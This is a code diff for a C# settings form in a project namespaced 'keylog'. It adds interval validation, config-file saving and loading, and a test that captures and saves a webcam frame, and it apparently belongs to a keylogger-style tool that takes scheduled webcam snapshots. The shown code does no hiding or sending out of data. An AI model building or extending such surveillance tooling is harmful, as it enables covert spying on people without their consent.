@@ -11,6 +11,7 @@ using System.IO;
 using AForge.Video.DirectShow;
 using System.Drawing.Imaging;
 using System.Threading;
+using tt;
 
 namespace keylog
 {
@@ -48,41 +49,43 @@ namespace keylog
             ////videoSourcePlayer.Start();
             ////Bitmap picture = videoSourcePlayer.GetCurrentVideoFrame();
 
-        }        
+        }
         private void btnMR_OK_Click(object sender, EventArgs e)
         {
             Dictionary<string, string> d = new Dictionary<string, string>();
             if (cb_enable.Checked == false)
             {
                 d.Add("Enable", "false");
+                d.Add("Hours", tb_hours.Text);
+                d.Add("Minutes", tb_minutes.Text);
             }
             else
             {
-                d.Add("Enable", "true");
-                d.Add("Hours", tb_hours.Text);
-                d.Add("Minutes", tb_minutes.Text);
+
+                if (tb_hours.Text.Trim() == "" || tb_hours.Text.All(char.IsDigit) == false)
+                    tb_hours.Text = "1";
+
+                if (tb_minutes.Text.Trim() == "" || tb_minutes.Text.All(char.IsDigit) == false)
+                    tb_minutes.Text = "30";
+
                 int iHours;
                 Int32.TryParse(tb_hours.Text.Trim(), out iHours);
                 int iMinutes;
                 Int32.TryParse(tb_minutes.Text.Trim(), out iMinutes);
-                if (tb_hours.Text.All(char.IsNumber) && tb_minutes.Text.All(char.IsNumber) && iHours >= 0 && iMinutes > 0 && tb_hours.Text.Trim() != "" && tb_minutes.Text.Trim() != "")
+                if (iMinutes > 3601 || iHours > 3601 || iMinutes <= 0 || iHours < 0)
                 {
-                    if (((iHours * 3600 * 1000) + (iMinutes * 60 * 1000)) >= 2000000000)
-                    {
-                        MessageBox.Show("Value hours from 0 to 500", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        return;
-                    }
-                }
-                else
-                {
-                    MessageBox.Show("Value hours from 0 to 500", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    MessageBox.Show("Value hours from 0 to 3600 \r\n Value minutes from 1 to 3600", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return;
                 }
+                d.Add("Enable", "true");
+                d.Add("Hours", tb_hours.Text);
+                d.Add("Minutes", tb_minutes.Text);
             }
 
             using (StreamWriter file = new StreamWriter("Webcam_config.ini"))
                 foreach (var entry in d)
                     file.WriteLine("{0},{1}", entry.Key, entry.Value);
+
         }
 
         private void bt_test_Click(object sender, EventArgs e)
@@ -92,7 +95,7 @@ namespace keylog
             videoSourcePlayer.VideoSource = videoCaptureSource;
             videoSourcePlayer.Start();
             Thread.Sleep(1000);
-            if (videoSourcePlayer.GetCurrentVideoFrame()!= null)
+            if (videoSourcePlayer.GetCurrentVideoFrame() != null)
             {
                 Bitmap picture = videoSourcePlayer.GetCurrentVideoFrame();
                 DateTime time = DateTime.Now;              // Use current time
@@ -104,10 +107,24 @@ namespace keylog
                     pictureBox1.Image = objBitmap;
                     picture.Save(strFilename, ImageFormat.Jpeg);
                     videoSourcePlayer.Stop();
-                    MessageBox.Show("Saved");
+                    // MessageBox.Show("Saved");
+                    Console.WriteLine("Webcam test ok!!!!");
                 }
             }
-            
+
+        }
+
+        private void Webcam_Load(object sender, EventArgs e)
+        {
+            if (File.Exists("Webcam_config.ini"))
+            {
+                Dictionary<string, string> wc_conf = new Dictionary<string, string>();
+                Functions.Load_File("Webcam_config.ini", wc_conf);
+                cb_enable.Checked = Boolean.Parse(wc_conf["Enable"].ToString());
+                tb_hours.Text = wc_conf["Hours"].ToString();
+                tb_minutes.Text = wc_conf["Minutes"].ToString();
+
+            }
         }
     }
 }
